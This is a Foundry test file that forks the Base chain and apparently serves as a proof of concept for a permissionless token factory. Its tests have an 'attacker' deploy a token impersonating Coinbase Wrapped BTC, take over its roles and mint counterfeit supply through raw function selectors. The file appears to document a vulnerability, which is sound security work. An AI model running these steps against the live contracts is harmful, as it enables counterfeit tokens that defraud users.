// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";

interface ITokenFactory {
    function implementation() external view returns (address);
    function deployToken(uint88 salt, string calldata name, string calldata symbol, string calldata currency, uint8 decimals, address a1, address a2, address a3, address a4, address a5) external returns (address);
}

interface IFiatToken {
    function owner() external view returns (address);
    function masterMinter() external view returns (address);
    function pauser() external view returns (address);
    function blacklister() external view returns (address);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function minters(address) external view returns (bool);
    function minterAllowance(address) external view returns (uint256);
    function mint(address to, uint256 amount) external returns (bool);
}

interface IMintForwarderFactory {
    function deployMintForwarder(uint88 salt, address a, address b) external returns (address);
}

interface IMintForwarder {
    function owner() external view returns (address);
    function tokenContract() external view returns (address);
    function mint(address to, uint256 amount) external;
}

contract T2FactoryTest is Test {
    function setUp() public {
        vm.createSelectFork("base", 59038136);
    }

    address constant TF = 0x0000D340e876e1De249CcA0FD91d91aE612741E8;
    address constant MFF = 0x000054fCEAB4632B9c8B7fd20cE9790352426716;
    address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;

    function test_TF_permissionlessDeploy() public {
        address attacker = address(0xA77ACC);
        // Predict CREATE2 address is not needed; just call as attacker
        vm.prank(attacker);
        address token = ITokenFactory(TF).deployToken(
            uint88(0xC0FFEE),
            "Coinbase Wrapped BTC",
            "cbBTC",
            "",
            8,
            attacker, // a1
            attacker, // a2
            attacker, // a3
            attacker, // a4
            attacker  // a5
        );
        emit log_named_address("deployed token proxy", token);
        assertTrue(token != address(0));
        assertEq(IFiatToken(token).name(), "Coinbase Wrapped BTC");
        assertEq(IFiatToken(token).symbol(), "cbBTC");
        assertEq(IFiatToken(token).decimals(), 8);
        emit log_named_address("owner", IFiatToken(token).owner());
        emit log_named_address("masterMinter", IFiatToken(token).masterMinter());
        emit log_named_address("pauser", IFiatToken(token).pauser());
        emit log_named_address("blacklister", IFiatToken(token).blacklister());
        // Attacker-controlled roles => attacker can mint unlimited counterfeit cbBTC
        assertEq(IFiatToken(token).owner(), attacker);
    }

    function test_TF_deployedTokenMintableByAttacker() public {
        address attacker = address(0xA77ACC);
        vm.prank(attacker);
        address token = ITokenFactory(TF).deployToken(
            uint88(0xBEEF01),
            "Coinbase Wrapped BTC",
            "cbBTC",
            "",
            8,
            attacker, attacker, attacker, attacker, attacker
        );
        // masterMinter is attacker (one of a1..a4); configure attacker as minter then mint
        // First find which arg became masterMinter
        address mm = IFiatToken(token).masterMinter();
        emit log_named_address("masterMinter", mm);
        // NOTE: a5 became the PROXY admin, so the attacker (as admin) cannot call
        // token fallback functions yet ("Cannot call fallback function from the proxy admin").
        // Attacker first hands proxy-admin to a dead address, then uses token roles.
        vm.prank(attacker);
        (bool okAdmin,) = token.call(abi.encodeWithSelector(bytes4(0x8f283970), address(0xdead)));
        assertTrue(okAdmin, "changeAdmin failed");
        // configureMinter is onlyMasterMinter; call as mm
        vm.prank(mm);
        // configureMinter(address,uint256) selector 0x4e44d956
        (bool ok,) = token.call(abi.encodeWithSelector(bytes4(0x4e44d956), attacker, type(uint256).max));
        assertTrue(ok, "configureMinter failed");
        vm.prank(attacker);
        assertTrue(IFiatToken(token).mint(attacker, 1000 * 1e8));
        assertEq(IFiatToken(token).totalSupply(), 1000 * 1e8);
    }

    function test_MFF_permissionlessDeploy() public {
        address attacker = address(0xA77ACC);
        vm.prank(attacker);
        address mf = IMintForwarderFactory(MFF).deployMintForwarder(uint88(0x1234), attacker, CBBTC);
        emit log_named_address("deployed mint forwarder", mf);
        assertTrue(mf != address(0));
        emit log_named_address("mf owner", IMintForwarder(mf).owner());
        emit log_named_address("mf token", IMintForwarder(mf).tokenContract());
    }
}
